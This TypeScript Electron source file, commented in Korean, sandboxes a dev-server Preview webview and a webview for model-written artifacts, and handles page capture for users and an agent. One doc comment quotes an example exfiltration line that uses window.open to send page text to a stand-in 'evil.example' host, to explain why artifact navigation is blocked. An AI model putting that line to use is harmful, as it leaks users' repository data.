import { app, session, shell, webContents } from 'electron'
import type { WebContents } from 'electron'
import { ARTIFACT_PARTITION, IPC, PREVIEW_PARTITION } from '@shared/types'
import type { ComposerAttachment, ImageAttachment, PreviewCaptureResult } from '@shared/types'
import { ARTIFACT_ORIGIN } from '@shared/artifactUrl'
import { previewLabel } from '@shared/devUrl'
import { formatPickedElement } from '@shared/previewPick'
import { cancelPick, pickElement } from './previewPicker'
import { PreviewIssueCollector } from './previewIssues'
import { log } from './logger'

/**
 * Preview 패널(`<webview>`)의 main 쪽 배선 — 게스트 페이지를 앱에서 떼어 놓는 울타리와 캡처.
 *
 * 여기 있는 것들이 전부 "게스트를 못 믿는다" 는 한 가지 전제에서 나온다. 미리보는 것은 개발
 * 중인 우리 dev 서버지만, 그 페이지가 불러오는 스크립트까지 우리 것은 아니다. 그래서 렌더러가
 * `<webview>` 태그에 적어 둔 설정을 그대로 믿지 않고 **붙는 순간 main 이 다시 강제한다** —
 * 태그 속성은 렌더러 안의 값이라, 렌더러가 한 번이라도 흔들리면 함께 흔들린다.
 */

/**
 * 캡처 이미지의 가로 상한(px). Retina 에서 전체 페이지를 그대로 뜨면 3000px 을 넘고, base64 로
 * 컴포저·IPC·모델 입력까지 그 크기가 따라간다. 화면을 알아볼 수 있으면 되는 용도라 여기서 줄인다.
 */
const MAX_CAPTURE_WIDTH = 1600

/** http/https 만. file:·about:·custom scheme 은 Preview 가 갈 곳이 아니다. */
function isWebUrl(url: string): boolean {
  return /^https?:\/\//i.test(url)
}

/**
 * 앱 창에 붙어도 되는 게스트 파티션. 이 목록 밖은 붙는 순간 거절된다.
 *
 * 둘로 나눠 둔 것 자체가 계약이다 — Preview 는 사용자의 dev 서버(웹을 돌아다녀도 된다),
 * 아티팩트는 모델이 쓴 코드(아무 데도 못 간다). 세션이 같으면 규칙도 같아지므로 가를 수 없다.
 */
const GUEST_PARTITIONS: readonly string[] = [PREVIEW_PARTITION, ARTIFACT_PARTITION]

/**
 * 콘솔·네트워크 문제 수집기. main 이 소유하고 개수만 렌더러로 흘린다([[previewIssues]]).
 * 모듈 수준에 두는 이유는 세션 배선(webRequest)이 앱 전체에 하나뿐이기 때문이다.
 */
let issues: PreviewIssueCollector

/** 수집기 접근자 — ipc 계층이 목록 조회·비우기·회신에 쓴다. */
export function previewIssues(): PreviewIssueCollector {
  return issues
}

/**
 * 렌더러로 이벤트를 보내는 통로(initPreview 가 받아 둔다).
 *
 * ipc 계층이 아니라 여기에도 들고 있는 이유는 에이전트 도구 때문이다 — 도구는 메인에서 돌지만
 * Preview 탭을 여는 것은 렌더러의 일이라, 사람이 누르는 "Open in Preview" 와 **같은 방송**을
 * 도구도 쓸 수 있어야 한다([[agent/tools/preview]]).
 */
let dispatchToRenderer: (channel: string, payload: unknown) => void = () => {}

/**
 * Preview 세션과 webview 울타리를 세운다(앱 기동 시 1회).
 *
 * `web-contents-created` 하나로 모든 창을 덮는 것이 요점이다 — 메인 창과 분리한 패널 창이
 * 각각 webview 를 붙일 수 있는데, 가드를 창마다 걸면 나중에 생긴 창에서 조용히 빠진다.
 */
export function initPreview(dispatch: (channel: string, payload: unknown) => void): void {
  dispatchToRenderer = dispatch
  issues = new PreviewIssueCollector(dispatch)
  issues.initSession()

  const previewSession = session.fromPartition(PREVIEW_PARTITION)
  // 미리보는 페이지에 카메라·마이크·알림·위치를 줄 이유가 없다. 물어보지도 않고 전부 거절한다.
  previewSession.setPermissionRequestHandler((_contents, _permission, callback) => callback(false))
  previewSession.setPermissionCheckHandler(() => false)

  app.on('web-contents-created', (_event, contents) => {
    // 이 webContents 가 **호스트**로서 webview 를 붙이려 할 때(창 → 게스트).
    contents.on('will-attach-webview', (event, webPreferences, params) => {
      // preload 는 앱의 IPC 표면 그 자체다 — 게스트에 딸려 들어가면 격리가 무의미해진다.
      delete webPreferences.preload
      webPreferences.nodeIntegration = false
      webPreferences.nodeIntegrationInSubFrames = false
      webPreferences.contextIsolation = true
      webPreferences.sandbox = true
      webPreferences.webviewTag = false

      // 파티션이 다르면 앱 세션의 쿠키·스토리지를 그대로 쓰게 된다. 그건 붙이지 않는다.
      if (!GUEST_PARTITIONS.includes(params.partition ?? '')) {
        log.error(`preview: refused a webview on partition "${params.partition ?? '(none)'}"`)
        event.preventDefault()
      }
    })

    // 여기서부터는 게스트(webview) 자신에게 거는 가드.
    if (contents.getType() !== 'webview') return

    // 아티팩트 게스트는 규칙이 다르다 — 아래 가드는 Preview 전용이다.
    if (contents.session === session.fromPartition(ARTIFACT_PARTITION)) {
      guardArtifactGuest(contents)
      return
    }

    // 새 창·팝업은 앱 안에 띄우지 않는다 — 주소창도 닫을 방법도 없는 창이 되기 때문이다.
    // 웹 주소면 사용자의 기본 브라우저로 넘긴다(거기엔 주소창이 있다).
    contents.setWindowOpenHandler(({ url }) => {
      if (isWebUrl(url)) void shell.openExternal(url)
      return { action: 'deny' }
    })

    // 게스트 안에서의 이동은 웹 주소인 한 자유롭게 둔다(dev 앱의 라우팅이 그렇다).
    // 그 밖의 스킴(file:·custom protocol)은 미리보기의 일이 아니므로 막는다.
    contents.on('will-navigate', (event, url) => {
      if (isWebUrl(url)) return
      event.preventDefault()
      log.info(`preview: blocked navigation to ${url}`)
    })
  })
}

/**
 * 아티팩트 게스트에게 거는 이동 가드 — Preview 와 갈라지는 이유가 여기 다 있다.
 *
 * 위의 Preview 가드는 http(s) 이동을 **허용**하고 새 창 요청을 사용자의 기본 브라우저로
 * 넘긴다. 미리보는 것이 사용자 자신의 dev 서버라면 맞는 판단이다.
 *
 * 모델이 쓴 코드에는 그게 유출 통로다:
 *
 * ```js
 * window.open('https://evil.example/?d=' + encodeURIComponent(document.body.innerText))
 * ```
 *
 * 이 한 줄이 사용자의 **진짜 브라우저**를 열어 방금 읽은 저장소 내용을 실어 보낸다.
 * CSP 로는 못 막는다 — `navigate-to` 지시문은 표준에서 빠졌고 Chromium 에 없다. 그래서
 * 이동은 세션 단위로 따로 막아야 한다.
 *
 * `will-navigate` 만으로는 부족하다 — 그건 **메인 프레임 전용**이다. 아티팩트가 iframe 을
 * 만들어 그 안에서 이동하면 통과한다. `will-frame-navigate` 가 서브프레임까지 덮는다.
 * (둘 다 `loadURL` 로는 안 뜨므로 우리가 버전을 갈아 끼우는 경로는 영향받지 않고,
 * 해시 이동에도 안 떠서 아티팩트 안의 `<a href="#toc">` 는 그대로 동작한다.)
 */
function guardArtifactGuest(contents: WebContents): void {
  contents.setWindowOpenHandler(({ url }) => {
    log.info(`artifact: blocked a new window to ${url}`)
    return { action: 'deny' }
  })

  const allowed = (url: string): boolean => url.startsWith(`${ARTIFACT_ORIGIN}/`)

  contents.on('will-navigate', (event, url) => {
    if (allowed(url)) return
    event.preventDefault()
    log.info(`artifact: blocked navigation to ${url}`)
  })

  contents.on('will-frame-navigate', (details) => {
    if (allowed(details.url)) return
    details.preventDefault()
    log.info(`artifact: blocked frame navigation to ${details.url}`)
  })
}

/**
 * webContents id 로 Preview 게스트를 찾는다. 못 찾거나 Preview 가 아니면 에러 문구를 돌려준다.
 *
 * 렌더러가 준 id 를 그대로 믿지 않는 것이 요점이다 — id 는 그냥 숫자라, 확인 없이 받으면
 * "아무 webContents 나 찍어(뒤져) 달라" 는 요청이 된다(다른 워크스페이스의 화면이든 앱 자신이든).
 * 캡처와 요소 픽커가 같은 관문을 쓰도록 한곳에 둔다.
 */
function resolveGuest(webContentsId: number): { guest: WebContents } | { error: string } {
  const guest = webContents.fromId(webContentsId)
  if (!guest || guest.isDestroyed()) return { error: 'The preview is not ready yet.' }
  if (guest.getType() !== 'webview' || guest.session !== session.fromPartition(PREVIEW_PARTITION))
    return { error: 'Refused to inspect that view.' }
  return { guest }
}

/** Preview 화면을 PNG 로 캡처한다. */
export async function capturePreview(
  url: string,
  webContentsId: number
): Promise<PreviewCaptureResult & { image?: ImageAttachment }> {
  const target = resolveGuest(webContentsId)
  if ('error' in target) return target

  try {
    let image = await target.guest.capturePage()
    if (image.isEmpty()) return { error: 'There is nothing to capture yet.' }
    if (image.getSize().width > MAX_CAPTURE_WIDTH)
      image = image.resize({ width: MAX_CAPTURE_WIDTH })
    return {
      image: {
        name: `preview-${previewLabel(url)}.png`,
        mediaType: 'image/png',
        dataBase64: image.toPNG().toString('base64')
      }
    }
  } catch (err) {
    log.error('preview: capturePage failed', err)
    return { error: err instanceof Error ? err.message : 'Could not capture the preview.' }
  }
}

/**
 * 요소 픽커를 켜고, 사용자가 고른 요소를 컴포저에 넣을 형태로 만들어 돌려준다.
 *
 * 그림과 설명을 **한 건**으로 묶어 내보내는 것이 요점이다([[shared/types]] ComposerAttachment) —
 * 크롭 이미지와 그 요소의 HTML·CSS 는 짝이라, 따로 흘려보내면 컴포저에서 순서가 갈린다.
 */
export async function pickPreviewElement(
  url: string,
  webContentsId: number
): Promise<PreviewCaptureResult & { attachment?: ComposerAttachment }> {
  const target = resolveGuest(webContentsId)
  if ('error' in target) return target

  const picked = await pickElement(target.guest)
  if ('error' in picked) return picked

  return {
    attachment: {
      text: formatPickedElement(picked, url),
      ...(picked.cropBase64
        ? {
            image: {
              name: `element-${previewLabel(url)}.png`,
              mediaType: 'image/png',
              dataBase64: picked.cropBase64
            }
          }
        : {})
    }
  }
}

/** 진행 중인 픽을 취소한다. 대상이 Preview 게스트가 아니면 아무 일도 하지 않는다. */
export function cancelPreviewPick(webContentsId: number): void {
  if ('error' in resolveGuest(webContentsId)) return
  cancelPick(webContentsId)
}

/**
 * 이 게스트의 콘솔·네트워크 문제를 이 워크스페이스 것으로 모으기 시작한다.
 * 렌더러가 dom-ready 에서 부른다 — 실제 페이지가 로드되기 전이라 첫 줄부터 놓치지 않는다.
 */
export function watchPreviewIssues(workspaceId: string, webContentsId: number): void {
  const target = resolveGuest(webContentsId)
  if ('error' in target) return
  rememberGuest(workspaceId, target.guest)
  issues.watch(workspaceId, target.guest)
}

// ── 에이전트가 쓰는 입구 ────────────────────────────────────────────────────
//
// 도구는 메인에서 도는데 게스트는 렌더러가 붙인다. 그래서 메인은 "이 워크스페이스의 Preview
// 게스트가 누구인가" 를 알아야 하고, 그 사실이 이미 한 번 지나가는 자리가 watchPreviewIssues 다
// (렌더러가 dom-ready 에서 워크스페이스와 게스트를 함께 알려 준다). 별도의 등록 IPC 를 새로
// 만들지 않고 그 길에 얹는다 — 두 개면 언젠가 한쪽만 불린다.

/** 워크스페이스 → 지금 붙어 있는 Preview 게스트. 워크스페이스당 화면에 하나뿐이다. */
const guests = new Map<string, WebContents>()

function rememberGuest(workspaceId: string, guest: WebContents): void {
  guests.set(workspaceId, guest)
  // 게스트가 죽으면 지운다. unwatch 를 못 받고 사라지는 경로(창이 통째로 닫힘)가 있다.
  guest.once('destroyed', () => {
    if (guests.get(workspaceId) === guest) guests.delete(workspaceId)
  })
}

/** 이 게스트를 잊는다(Preview 패널이 사라질 때, unwatch 와 같은 자리에서). */
export function forgetPreviewGuest(webContentsId: number): void {
  for (const [workspaceId, guest] of guests) {
    if (guest.id === webContentsId) guests.delete(workspaceId)
  }
}

/**
 * 이 워크스페이스의 Preview 게스트. 없으면 null — Preview 탭이 아직 열리지 않았거나, 사용자가
 * 지금 다른 워크스페이스를 보고 있다는 뜻이다(WorkPanel 은 선택된 워크스페이스만 마운트한다).
 */
export function previewGuestFor(workspaceId: string): WebContents | null {
  const guest = guests.get(workspaceId)
  if (!guest || guest.isDestroyed()) {
    guests.delete(workspaceId)
    return null
  }
  return guest
}

/**
 * Preview 탭을 열라고 모든 창에 방송한다. 사람이 누르는 "Open in Preview" 와 같은 신호다.
 *
 * `url` 이 비면 탭만 열고 이동은 하지 않는다 — 에이전트 경로에서는 이동을 메인이 직접 하기
 * 때문이다([[agent/tools/preview]]). 렌더러와 메인이 같은 게스트에 각자 loadURL 을 걸면 서로를
 * ERR_ABORTED 로 끊어, "열었는데 왜 실패했는지" 를 아무도 정확히 말할 수 없게 된다.
 */
export function requestPreviewOpen(workspaceId: string, url: string): void {
  dispatchToRenderer(IPC.evtPreviewOpen, { workspaceId, url })
}

/**
 * 에이전트에게 돌려줄 캡처의 base64 상한. 이미지는 잘라 낼 수가 없으므로(반쪽 PNG 는 그림이
 * 아니다) 상한을 넘으면 **줄인다**. 줄였다는 사실은 결과에 적어 보낸다.
 */
const MAX_AGENT_CAPTURE_BASE64 = 1_000_000

/** 상한에 맞출 때까지 차례로 내려가 볼 가로 크기(px). 첫 값이 기본 해상도다. */
const AGENT_CAPTURE_WIDTHS = [1280, 1024, 768, 512]

export interface AgentCapture {
  dataBase64: string
  width: number
  height: number
  /** 상한에 맞추려고 줄였다면 원래 크기. 안 줄였으면 없다. */
  scaledFrom?: { width: number; height: number }
}

/**
 * 에이전트에게 돌려줄 화면을 찍는다.
 *
 * 사람용 캡처(capturePreview)와 나눠 둔 이유는 예산이 다르기 때문이다. 사람 쪽은 컴포저에
 * 붙어 사용자가 보고 지울 수 있지만, 이쪽은 모델의 컨텍스트에 그대로 들어가 그 세션의 남은
 * 요청마다 다시 실린다 — 큰 그림 한 장의 값이 한 번이 아니다.
 */
export async function captureForAgent(
  guest: WebContents
): Promise<{ capture: AgentCapture } | { error: string }> {
  try {
    const shot = await guest.capturePage()
    const original = shot.getSize()
    if (shot.isEmpty() || original.width === 0 || original.height === 0) {
      return {
        error:
          'The preview rendered nothing to capture. Wooi only paints the preview while its tab ' +
          'is on screen, so this usually means the user moved to another tab or workspace.'
      }
    }

    // 원본보다 크게 늘리지 않는다 — 확대는 정보를 더하지 않고 바이트만 늘린다. 원본이 첫
    // 단계보다 이미 작으면 사다리는 비고, 그때는 원본 크기 하나만 시도한다.
    const ladder = AGENT_CAPTURE_WIDTHS.filter((w) => w < original.width)
    let chosen = shot
    let dataBase64 = ''
    for (const width of ladder.length ? ladder : [original.width]) {
      chosen = width === original.width ? shot : shot.resize({ width })
      dataBase64 = chosen.toPNG().toString('base64')
      if (dataBase64.length <= MAX_AGENT_CAPTURE_BASE64) break
    }

    const size = chosen.getSize()
    return {
      capture: {
        dataBase64,
        width: size.width,
        height: size.height,
        ...(size.width < original.width ? { scaledFrom: original } : {})
      }
    }
  } catch (err) {
    log.error('preview: agent capturePage failed', err)
    return { error: err instanceof Error ? err.message : 'Could not capture the preview.' }
  }
}
